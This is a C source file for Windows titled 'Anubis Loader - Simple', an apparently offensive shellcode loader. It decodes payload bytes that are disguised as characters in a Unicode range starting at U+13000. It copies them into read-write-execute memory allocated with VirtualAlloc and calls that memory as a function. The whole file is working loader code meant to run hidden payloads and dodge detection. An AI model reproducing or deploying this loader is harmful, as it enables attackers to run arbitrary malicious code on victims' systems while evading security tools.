#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <stdint.h>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("Usage: %s <encoded_file>\n", argv[0]);
        return 1;
    }
    
    printf("=== Anubis Loader - Simple ===\n");
    
    FILE* file = fopen(argv[1], "rb");
    if (!file) {
        printf("[!] Failed to open file: %s\n", argv[1]);
        return 1;
    }
    
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    if (file_size <= 0) {
        printf("[!] Invalid file size\n");
        fclose(file);
        return 1;
    }
    
    printf("[*] File size: %ld bytes\n", file_size);
    
    char* utf8_buffer = malloc(file_size);
    if (!utf8_buffer) {
        printf("[!] Failed to allocate memory for UTF-8 buffer\n");
        fclose(file);
        return 1;
    }
    
    size_t bytes_read = fread(utf8_buffer, 1, file_size, file);
    fclose(file);
    
    if (bytes_read != file_size) {
        printf("[!] Failed to read entire file\n");
        free(utf8_buffer);
        return 1;
    }
    
    int wide_chars = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, NULL, 0);
    if (wide_chars <= 0) {
        printf("[!] Failed to calculate wide character buffer size\n");
        free(utf8_buffer);
        return 1;
    }
    
    wchar_t* wide_buffer = malloc(wide_chars * sizeof(wchar_t));
    if (!wide_buffer) {
        printf("[!] Failed to allocate memory for wide buffer\n");
        free(utf8_buffer);
        return 1;
    }
    
    int converted = MultiByteToWideChar(CP_UTF8, 0, utf8_buffer, file_size, wide_buffer, wide_chars);
    free(utf8_buffer);
    
    if (converted <= 0) {
        printf("[!] Failed to convert to wide characters\n");
        free(wide_buffer);
        return 1;
    }
    
    size_t shellcode_len = 0;
    const uint32_t base_unicode = 0x13000;
    
    for (int i = 0; i < converted; i++) {
        uint32_t char_code;
        
        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
            (i + 1 < converted) && 
            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
            i++;
        } else {
            char_code = (uint32_t)wide_buffer[i];
        }
        
        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
            shellcode_len++;
        }
    }
    
    if (shellcode_len == 0) {
        printf("[!] No valid shellcode bytes found\n");
        free(wide_buffer);
        return 1;
    }
    
    printf("[*] Expected shellcode length: %zu bytes\n", shellcode_len);
    
    unsigned char* shellcode = malloc(shellcode_len);
    if (!shellcode) {
        printf("[!] Failed to allocate memory for shellcode\n");
        free(wide_buffer);
        return 1;
    }
    
    size_t shellcode_index = 0;
    for (int i = 0; i < converted && shellcode_index < shellcode_len; i++) {
        uint32_t char_code;
        
        if ((wide_buffer[i] >= 0xD800) && (wide_buffer[i] <= 0xDBFF) && 
            (i + 1 < converted) && 
            (wide_buffer[i + 1] >= 0xDC00) && (wide_buffer[i + 1] <= 0xDFFF)) {
            uint32_t high_surrogate = wide_buffer[i] & 0x3FF;
            uint32_t low_surrogate = wide_buffer[i + 1] & 0x3FF;
            char_code = 0x10000 + (high_surrogate << 10) + low_surrogate;
            i++;
        } else {
            char_code = (uint32_t)wide_buffer[i];
        }
        
        if (char_code >= base_unicode && char_code <= base_unicode + 0xFF) {
            shellcode[shellcode_index++] = (unsigned char)(char_code - base_unicode);
        }
    }
    
    free(wide_buffer);
    
    printf("[*] Decoded %zu bytes\n", shellcode_index);
    printf("[*] First 32 bytes: ");
    for (size_t i = 0; i < (shellcode_index < 32 ? shellcode_index : 32); i++) {
        printf("%02X ", shellcode[i]);
    }
    printf("\n");
    
    void* exec_mem = VirtualAlloc(NULL, shellcode_index, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        printf("[!] VirtualAlloc failed\n");
        free(shellcode);
        return 1;
    }
    
    memcpy(exec_mem, shellcode, shellcode_index);
    
    printf("[*] Shellcode allocated at: %p\n", exec_mem);
    printf("[*] Press Enter to execute...");
    getchar();
    
    // Simple execution
    void (*shellcode_func)() = (void (*)())exec_mem;
    shellcode_func();
    
    free(shellcode);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}
